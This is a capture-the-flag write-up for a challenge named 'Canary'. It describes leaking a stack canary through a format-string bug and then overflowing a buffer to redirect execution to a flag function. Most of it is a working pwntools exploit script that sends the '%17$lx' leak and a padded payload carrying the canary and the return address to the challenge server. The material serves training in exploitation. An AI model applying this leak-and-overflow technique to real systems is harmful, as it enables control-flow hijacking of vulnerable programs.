# Canary

Use pattern.py to flood the second input, put a breakpoint at the line in greet which compares the canaries. Check rax using gdb, feed that back into pattern.py, 56 bytes before canary. Fuzz format string output until you find the one that's always 8 bytes long, that's the canary Make a script that leaks the canary then overflows the buffer with `56 junk bytes + canary + 8 junk bytes + flag address`

## Note: canary is just before ebp, which is why you must put 8 junk bytes to fill up ebp

```python
from pwn import *
import re
e = ELF("./canary")
p = remote("shell.actf.co" ,20701)
for _ in range(23):
            p.recvline()
p.recvline()
p.sendline("%17$lx")
flagaddr = 0x0000000000400787
output = p.recvline()
num = re.findall("Nice to meet you, (.*)!", output)
canary = int(num[0], 16)
log.info("Canary: " + hex(canary))
firstpad = 'A' * 56 #Junk before the canary
canaryString = p64(canary)
neweip = p64(flagaddr)
lastpad = 'B' * 8
payload = firstpad + canaryString + lastpad + neweip
p.sendline(payload)
log.info("Response: " + p.recvline())
```

